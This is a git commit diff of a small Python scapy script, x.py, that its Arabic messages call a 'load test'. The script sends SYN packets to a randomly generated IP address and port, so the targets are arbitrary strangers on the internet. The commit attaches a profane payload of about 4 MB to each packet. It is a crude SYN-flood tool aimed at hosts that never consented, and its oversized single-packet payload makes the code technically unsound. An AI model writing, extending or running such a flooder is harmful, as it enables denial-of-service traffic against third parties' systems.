aba41a1ae3bd4f193c08c090ac2426d2bb343e0b
Acuma 🌹 <ang089afk@gmail.com>
2025-04-26 19:51:28 +0100

    Update x.py

--- x.py
+++ x.py
@@ -1,7 +1,7 @@
+import threading
 from scapy.all import *
 import random
 import time
-import threading
 
 def generate_random_ip():
     return '.'.join(str(random.randint(0, 255)) for _ in range(4))
@@ -10,19 +10,20 @@ def generate_random_port():
     return random.randint(1024, 65535)
 
 def send_syn_packet(target_ip, target_port):
+    payload = Raw(load="fuck" * 1048576)
     ip = IP(dst=target_ip)
     syn = TCP(dport=target_port, flags="S", seq=random.randint(1000, 9000))
-    packet = ip/syn
+    packet = ip/syn/payload
     send(packet, verbose=False)
 
 def load_test():
     target_ip = generate_random_ip()
     target_port = generate_random_port()
-    print(f"بدأ الاختبار: إرسال حزم إلى {target_ip} على المنفذ {target_port}")
+    print(f"بدأ الاختبار: إرسال حزم بحجم 1 ميجا إلى {target_ip} على المنفذ {target_port}")
     
-    for i in range(100):
+    for i in range(10):
         send_syn_packet(target_ip, target_port)
-        time.sleep(0.1)
+        time.sleep(0.2)
     
     print("انتهى الاختبار!")
 
